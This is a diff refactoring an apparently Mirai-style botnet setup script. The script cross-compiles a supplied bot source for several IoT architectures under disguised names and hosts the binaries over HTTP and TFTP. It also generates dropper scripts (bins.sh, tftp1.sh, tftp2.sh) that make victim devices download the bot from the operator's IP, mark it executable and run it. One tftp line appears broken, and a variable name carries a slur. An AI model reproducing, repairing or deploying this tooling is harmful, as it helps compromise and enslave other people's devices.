@@ -8,15 +8,11 @@ else:
     print("\x1b[0;31mIncorrect Usage!")
     print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
     exit(1)
-    
+
 bot = sys.argv[1]
 
 yourafag = raw_input("Get arch's? Y/n:")
-if yourafag.lower() == "y":
-    get_arch = True
-else:
-    get_arch = False
-
+get_arch = yourafag.lower() == "y"
 compileas = ["GHfjfgvj", #mips
              "JIPJIPJj", #mipsel
              "jhUOH", #sh4
@@ -61,18 +57,17 @@ if get_arch == True:
     print("Downloading Architectures")
 
     for arch in getarch:
-        run("wget " + arch + " --no-check-certificate >> /dev/null")
+        run(f"wget {arch} --no-check-certificate >> /dev/null")
         run("tar -xvf *tar.bz2")
         run("rm -rf *tar.bz2")
 
     print("Cross Compilers Downloaded...")
 
-num = 0
-for cc in ccs:
+for num, cc in enumerate(ccs):
     arch = cc.split("-")[2]
-    run("./"+cc+"/bin/"+arch+"-gcc -static -lpthread -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
-    num += 1
-
+    run(
+        f"./{cc}/bin/{arch}-gcc -static -lpthread -pthread -D{arch.upper()} -o {compileas[num]} {bot} > /dev/null"
+    )
 print("Cross Compiling Done!")
 print("Setting up your httpd and tftp")
 
@@ -102,17 +97,23 @@ service tftp
 run("service xinetd start")
 
 for i in compileas:
-    run("cp " + i + " /var/www/html")
-    run("mv " + i + " /var/lib/tftpboot")
+    run(f"cp {i} /var/www/html")
+    run(f"mv {i} /var/lib/tftpboot")
 
 run('echo -e "ulimit -n 712" > /var/lib/tftpboot/tftp1.sh')
 run('echo -e "cp /bin/busybox /tmp/" > /var/lib/tftpboot/tftp1.sh')
 run('echo -e "ulimit -n 712" > /var/lib/tftpboot/tftp2.sh')
 
 for i in compileas:
-    run('echo -e "cd /tmp; wget http://' + ip + '/' + i + '; chmod 777 ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
-    run('echo -e "cd /tmp; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
-    run('echo -e "cd /tmp; tftp -r ' + ip + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
+    run(
+        f'echo -e "cd /tmp; wget http://{ip}/{i}; chmod 777 {i}; ./{i}; rm -rf {i}" >> /var/www/html/bins.sh'
+    )
+    run(
+        f'echo -e "cd /tmp; tftp {ip} -c get {i};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh'
+    )
+    run(
+        f'echo -e "cd /tmp; tftp -r {ip} -g {ip};cat {i} >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh'
+    )
 
 run("service xinetd restart")
 run("service httpd restart")
